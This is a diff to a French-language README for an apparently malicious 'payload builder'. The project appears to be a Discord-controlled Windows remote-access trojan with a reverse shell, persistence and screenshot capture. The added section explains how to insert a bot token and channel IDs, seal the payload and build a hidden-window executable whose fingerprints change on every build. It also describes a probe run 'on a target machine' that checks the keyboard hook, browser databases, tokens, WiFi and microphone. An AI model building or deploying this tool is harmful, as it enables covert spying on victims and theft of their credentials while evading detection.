@@ -83,3 +83,44 @@ repli, hôte de reverse shell, cadences, persistance, échelle des captures.
 ## Licence
 
 Usage privé. Aucune garantie.
+
+## Reprendre ce dépôt (aucun jeton fourni)
+
+Le dépôt ne contient **aucune** configuration réelle : ni jeton de bot, ni
+identifiant de serveur ou de salon, ni `payload.enc`. Pour construire votre
+propre binaire :
+
+```bat
+git clone https://github.com/cameleonnbss/francais2nd-payload-builder
+cd francais2nd-payload-builder
+copy payload.example.json payload.json
+```
+
+Éditez `payload.json` et renseignez **vos** valeurs :
+
+```json
+"bot_token": "VOTRE_JETON_DE_BOT",
+"guild_id": "ID_DE_VOTRE_SERVEUR",
+"channel_id": "ID_DU_SALON_DE_REPLI"
+```
+
+Puis :
+
+```bat
+go run ./cmd/seal
+go build -ldflags "-H windowsgui -s -w -buildid=" -o app.exe .
+```
+
+ou directement `.\build.ps1 -Out app.exe` (empreintes renouvelées à chaque
+build). `payload.json` et `payload.enc` restent gitignorés : ne les commitez
+jamais.
+
+Vérification rapide sur une machine cible, sans Discord :
+
+```bat
+app.exe -probe
+```
+
+Le rapport `payload-probe.txt` (à côté de l'exécutable) liste en OK/KO la
+configuration, le dossier de travail, les salons, la capture d'écran, le
+crochet clavier, les bases navigateurs, les jetons, le WiFi et le micro.
